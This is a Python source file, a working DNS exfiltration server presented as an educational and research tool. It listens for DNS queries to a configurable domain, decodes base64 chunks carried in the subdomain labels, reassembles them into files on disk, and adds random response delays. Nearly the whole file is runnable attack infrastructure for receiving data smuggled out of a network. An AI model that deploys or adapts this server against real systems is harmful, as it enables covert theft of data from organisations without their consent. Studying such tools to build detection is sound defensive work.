#!/usr/bin/env python3
"""
Module Name: server.py

Description: This module is an example implementation of a DNS exfiltration server.
I created this server to better understand DNS exfiltration techniques and to test the server implementation.
The server listens for DNS queries and extracts data from the subdomain of the query.
The subdomain contains a unique identifier, the sequence number of the chunk, the total number of chunks, and the chunk data.
The server uses the dnslib library to parse DNS queries and send DNS responses only if the query matches the specific domain. A response 
delay is added to help rate limit the requests to protect DNS servers in the recursive chain. for testing on local host a delay of 0.1s can be manually set.

Disclaimer: The DNS Exfiltration Tool is developed for educational and research purposes only. 
It is intended to help users learn about and study DNS exfiltration techniques in a controlled, responsible, and legal environment.

This tool should not be used on any network, system, or domain without explicit permission from the rightful owners or administrators. 
Unauthorized use of this tool to perform DNS exfiltration or any other form of unauthorized data extraction could violate local, state, national, and international laws.

By downloading, copying, installing, or using the software, you agree to use it in a manner consistent with your local laws. 
The authors of this software disclaim all liability for any illegal use of this tool and any damages that may occur from its use. 
It is your responsibility to comply with all applicable laws and to use the software ethically and responsibly.

Author: John Burns
Date: 2024-04-30
Version: 1.0
"""


import struct
import socket
import base64
from collections import defaultdict
import os
import argparse
from dnslib import DNSRecord, RR, QTYPE, DNSHeader, A
import time
import random

# Dictionary to hold incoming data fragments by identifier and expected
# sequence count
data_fragments = defaultdict(lambda: {})
expected_counts = defaultdict(int)


def parse_dns_header(data):
    id, flags, qdcount, ancount, nscount, arcount = struct.unpack(
        '!6H', data[:12])
    # print(f"ID: {id}, Flags: {flags}, QDCount: {qdcount}, ANCount: {
    #   ancount}, NSCount: {nscount}, ARCount: {arcount}")
    return id, flags


def parse_dns_query_section(data):
    offset = 12  # Start after the header (12 bytes)
    labels = []
    try:
        while True:
            length = data[offset]
            if length == 0:
                offset += 1  # Move past the zero byte
                break
            if offset + length >= len(data):
                # print(f"Invalid length byte: {length} at offset {
             #                 offset}, remaining data: {len(data) - offset}")
                return False
            offset += 1  # Move past the length byte
            label = data[offset:offset + length]
            labels.append(label.decode('ascii'))
            offset += length
        domain_name = '.'.join(labels)
        qtype, qclass = struct.unpack('!HH', data[offset:offset + 4])
        # print(f"Domain Name: {domain_name}, QType: {qtype}, QClass: {qclass}")
        return domain_name
    except Exception as e:
        # print(f"Failed to parse DNS query section: {e}")
        return False


def handle_dns_request(data, addr, sock, args):
    # print(f"Raw data received (hex): {data.hex()}")
    dns_id, dns_flags = parse_dns_header(data)
    if dns_flags:
        # print("DNS header parsed successfully.")
        domain_name = parse_dns_query_section(data)

        if domain_name:
            if domain_name.split(".", 1)[1] != args.domain:
                print("Invalid domain name")
                return
            # print("DNS query section parsed successfully.")
            pause_time = random.randint(args.low, args.high)
            time.sleep(pause_time / 1000)
            process_query(domain_name)
            send_dns_response(data, addr, sock)
        else:
            print("DNS query section parsing failed.")


def send_dns_response(data, addr, sock):
    try:
        request = DNSRecord.parse(data)
        reply = request.reply()
        reply.add_answer(RR(request.q.qname, QTYPE.A,
                         rdata=A("192.0.2.1"), ttl=300))
        response_data = reply.pack()
        sock.sendto(response_data, addr)
        # print("DNS response sent using dnslib.")
    except Exception as e:
        print(f"Error sending DNS response: {e}")


def process_query(domain_name):
    parts = domain_name.split('.')
    identifier_segment = parts[0]
    identifier, segment_index, total_segments, encoded_data = identifier_segment.split(
        '-', 3)
    print(f"Received encoded data: {encoded_data}")  # Debug print

    try:
        decoded_data = base64.urlsafe_b64decode(encoded_data + '==')
        # print(f"Decoded data: {decoded_data.decode('utf-8', 'replace')}")
    except Exception as e:
        print(f"Error decoding data: {e}")
        return

    index = int(segment_index)
    total = int(total_segments)
    expected_counts[identifier] = total
    data_fragments[identifier][index] = decoded_data
    if len(data_fragments[identifier]) == total:
        save_data(identifier, data_fragments[identifier])


def save_data(identifier, fragments):
    # Ensure fragments are sorted by index
    sorted_data = [fragments[i] for i in sorted(fragments)]
    file_content = b''.join(sorted_data)
    output_filename = os.path.join(args.output_dir, f"{identifier}.bin")
    os.makedirs(args.output_dir, exist_ok=True)
    with open(output_filename, 'wb') as f:
        f.write(file_content)


def get_args():
    parser = argparse.ArgumentParser(description="DNS Exfiltration Server")
    parser.add_argument("--port", type=int, default=5300,
                        help="The port on which the server listens")
    parser.add_argument("--output-dir", default="output",
                        help="Directory to save the extracted files")
    parser.add_argument("--low", type=int, default=100,
                        help="Minimum delay in milliseconds before responding")
    parser.add_argument("--high", type=int, default=1500,
                        help="Maximum delay in milliseconds before responding")
    parser.add_argument("--domain", default="exfil.example.com",
                        help="The domain name to match for DNS queries")
    return parser.parse_args()


def start_server(args):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', args.port))
    print(f"DNS server listening on port {args.port}...")
    try:
        while True:
            sock.settimeout(1)
            try:
                data, addr = sock.recvfrom(1024)
            except socket.timeout:
                continue
            handle_dns_request(data, addr, sock, args)
    except KeyboardInterrupt:
        print("Shutting down the server.")
    finally:
        sock.close()


if __name__ == "__main__":
    args = get_args()
    start_server(args)
